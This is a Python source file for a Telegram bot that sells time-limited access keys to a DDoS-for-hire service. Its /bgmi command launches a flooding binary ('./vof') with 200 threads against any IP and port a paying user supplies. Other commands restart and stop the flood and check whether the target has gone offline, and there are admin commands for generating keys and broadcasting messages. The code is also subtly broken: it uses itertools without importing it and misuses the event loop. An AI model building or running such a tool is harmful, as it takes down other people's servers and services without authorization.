from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import aiohttp
import asyncio
import requests
import subprocess
import json
import os
import random
import string
import datetime
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"
ATTACK_STATUS_FILE = "attack_status.json"

DEFAULT_THREADS = 200
users = {}
keys = {}
user_processes = {}
attack_status = {}

# Proxy related functions with aiohttp
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None
session = None

async def init_aiohttp_session():
    global session
    if session is None:
        session = aiohttp.ClientSession()

async def close_aiohttp_session():
    global session
    if session is not None:
        await session.close()
        session = None

async def get_proxies():
    global proxy_iterator, session
    if session is None:
        await init_aiohttp_session()
    try:
        async with session.get(proxy_api_url) as response:
            if response.status == 200:
                proxies = (await response.text()).splitlines()
                if proxies:
                    proxy_iterator = itertools.cycle(proxies)
                    return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = asyncio.get_event_loop().run_until_complete(get_proxies())
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def load_data():
    global users, keys, attack_status
    users = load_users()
    keys = load_keys()
    attack_status = load_attack_status()

def load_attack_status():
    try:
        with open(ATTACK_STATUS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading attack status: {e}")
        return {}

def save_attack_status():
    with open(ATTACK_STATUS_FILE, "w") as file:
        json.dump(attack_status, file)

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

def update_attack_status(user_id, target_ip=None, port=None, duration=None, status="stopped"):
    attack_status[user_id] = {
        "target_ip": target_ip,
        "port": port,
        "duration": duration,
        "status": status,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') if status == "running" else None
    }
    save_attack_status()

async def check_target_status(target_ip, port):
    global session
    if session is None:
        await init_aiohttp_session()
    try:
        async with session.get(f'http://{target_ip}:{port}', timeout=5) as response:
            return response.status
    except:
        return None

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @UknowJoHaN")
        return

    if user_id in attack_status:
        attack_info = attack_status[user_id]
        if attack_info["status"] == "running":
            start_time = datetime.datetime.strptime(attack_info["start_time"], '%Y-%m-%d %H:%M:%S')
            elapsed_time = (datetime.datetime.now() - start_time).seconds
            remaining_time = max(0, int(attack_info["duration"]) - elapsed_time)
            
            # Check target status
            target_status = await check_target_status(attack_info['target_ip'], attack_info['port'])
            target_status_msg = f"🎯 Target Status: {'🟢 Online' if target_status else '🔴 Offline'}"
            
            status_msg = (
                f"🎯 Target: {attack_info['target_ip']}:{attack_info['port']}\n"
                f"⏱ Duration: {attack_info['duration']}s\n"
                f"⏳ Remaining: {remaining_time}s\n"
                f"📊 Status: {attack_info['status'].upper()}\n"
                f"🔄 Threads: {DEFAULT_THREADS}\n"
                f"{target_status_msg}"
            )
        else:
            status_msg = "No active attack running"
    else:
        status_msg = "No attack status available"

    await update.message.reply_text(status_msg)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @UknowJoHaN")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    # Check if target is reachable
    target_status = await check_target_status(target_ip, port)
    if target_status is None:
        await update.message.reply_text("⚠️ Warning: Target appears to be offline or unreachable")

    command = ['./vof', target_ip, port, duration, str(DEFAULT_THREADS)]

    process = subprocess.Popen(command)
    
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}
    update_attack_status(user_id, target_ip, port, duration, "running")
    
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.\nOWNER- @UknowJoHaN')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key buy key from- @UknowJoHaN")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    if user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text('Flooding is already running.')
        return

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    attack_info = attack_status.get(user_id, {})
    update_attack_status(
        user_id,
        attack_info.get("target_ip"),
        attack_info.get("port"),
        attack_info.get("duration"),
        "running"
    )
    await update.message.reply_text('Started flooding.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Dm to buy key from- @UknowJoHaN")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding process is running.\nOWNER @UknowJoHaN')
        return

    user_processes[user_id]["process"].terminate()
    update_attack_status(user_id, status="stopped")
    del user_processes[user_id]  # Clear the stored parameters
    
    await update.message.reply_text('Stopped flooding and cleared saved parameters.')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "🔑 This is @UknowJoHaN bot.\n"
        "Commands:\n"
        "/redeem <key> - Redeem your access key\n"
        "/status - Check current attack status\n"
        "/bgmi <target_ip> <port> <duration> - Start new attack\n"
        "/stop - Stop current attack\n"
        "/start - Start attack with saved parameters\n"
        "/genkey <hours/days> - Generate new key (Admin only)\n"
        "\nOWNER- @UknowJoHaN"
    )
    await update.message.reply_text(help_text)

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER @UknowJoHaN"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @UknowJoHaN..."
        else:
            response = "Invalid or expired key buy from @UknowJoHaN."
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    async with session.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getChat', 
                                         params={'chat_id': int(user_id)}) as resp:
                        if resp.status == 200:
                            user_info = await resp.json()
                            username = user_info['result'].get('username', f"UserID: {user_id}")
                            response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                async with session.post(
                    f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                    json={'chat_id': int(user), 'text': message}
                ) as resp:
                    if resp.status != 200:
                        print(f"Error sending message to {user}: {await resp.text()}")
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)

async def main():
    # Initialize data and aiohttp session
    load_data()
    await init_aiohttp_session()
    
    # Create application and add handlers
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))

    try:
        # Start the bot
        await app.initialize()
        await app.start()
        await app.run_polling(allowed_updates=Update.ALL_TYPES)
    finally:
        # Cleanup
        await close_aiohttp_session()
        await app.stop()

if __name__ == '__main__':
    asyncio.run(main())